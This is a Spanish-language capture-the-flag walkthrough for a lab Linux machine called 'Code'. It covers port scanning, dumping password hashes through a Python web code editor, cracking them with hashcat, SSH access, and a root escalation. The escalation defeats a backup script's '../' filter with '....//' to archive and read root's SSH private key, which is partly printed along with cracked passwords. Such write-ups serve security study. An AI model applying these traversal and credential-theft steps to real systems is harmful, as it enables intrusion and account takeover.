# Información

+ Nombre: Code
+ IP: 10.129.231.240
+ OS: Linux
+ Dificultad: Easy

# Enumeración

## Nmap

Primer escaneo:

```
nmap -p- -sS -Pn -n --open -oG allports 10.129.231.240
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Escaneo detallado:

```
nmap -p22,5000 -sCV -oN recon 10.129.231.240
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el puerto 5000 hay un servidor web `Gunicorn`. 
## Web

En la pagina se encuentra un editor de codigo pyhton:

![[web.png]]

Intento de ejecutar comandos en el sistema con `os`, pero esta restringido:

![[os.png]]

![[os2.png]]

Enumero variables y clases globales:

![[globals.png]]

db y User son interesantes.

![[type.png]]

`User` es `sqlalchemy`.

+ `Sqlalchemy` es una librería de python para trabajar con bases de datos relacionales.

![[dir.png]]

Columnas `id`, `username` y `password` en `User`.

usuarios y hashes de contraseña:

![[query.png]]

## Hashcat

Uso hashcat para intentar crackear los hashes:

```
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
``` 

+ `-a 0` para indicar ataque con diccionario.
+ `-m 0` indicar el tipo de hash, `0` pertenece a md5.

```
759b74ce43947f5f4c91aeddc3e5bad3:development              
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

# Shell como martin

Las credenciales `martin` y `nafeelswordsmaster` son validas para conexión por `ssh`:

![[ssh.png]]

![[martin.png]]
# PrivEsc

![[sudo.png]]

`martin` puedo ejecutar `backy.sh` sin contraseña y como cualquier usuario(`incluyendo root`).

`backy.sh`:

```
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

En el directorio `home` de `martin` hay un directorio `backup` con un comprimido y un archivo `task.json`:

![[json.png]]

El script usa un archivo json para crear un backup.

+ `destination:` El directorio donde se guarda el backup.
+ `directories_to_archive:` directorios a comprimir.
+ `exclude: .*` excluye archivos que comiencen en `.` que son archivos ocultos. 

Creo una copia de `task.json`:

```
cp task.json crab.json
```

Intento crear un backup de la clave privada `id_rsa` del usuario `root`:

```
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/../root/.ssh/id_rsa"
        ]
}
```

Los  `..` son para retroceder al directorio raiz, porque el script valida si el path comienza en `/home/ o /var/`.

Fail:
![[sudo2.png]]

En el script `gsub("\\.\\./"; "")` esta remplazando `../` por cadenas vacias.

Agrego doble `../` 
`/home/....//root/.ssh/id_rsa`

![[sudo3.png]]

Lo descomprimo y leo la clave privada `id_rsa`:

```
tar -jxf code_home_.._root_.ssh_id_rsa_2025_August.tar.bz2
```

```
cat root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<..snip..>
j6PbYp7f9qvasJPc6T8PGwtybdk0LdluZwAC4x2jn8wjcjb5r8LYOgtYI5KxuzsEY2EyLh
hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
-----END OPENSSH PRIVATE KEY-----
```

Copio la clave en un archivo llamado `id_rsa`:

![[root.png]]

```
root@code:~# whoami
root
root@code:~# hostname -I
10.129.231.240 dead:beef::250:56ff:fe94:7aae 
root@code:~# cat /root/root.txt
636b0bf9************************
```

Se me olvido la flag `user.txt`, se encuentra en el directorio home `app-production`, el usuario `martin` no tiene permisos para acceder a el:

```
root@code:~# cat /home/app-production/user.txt
8695228907f*********************
```

# 🦀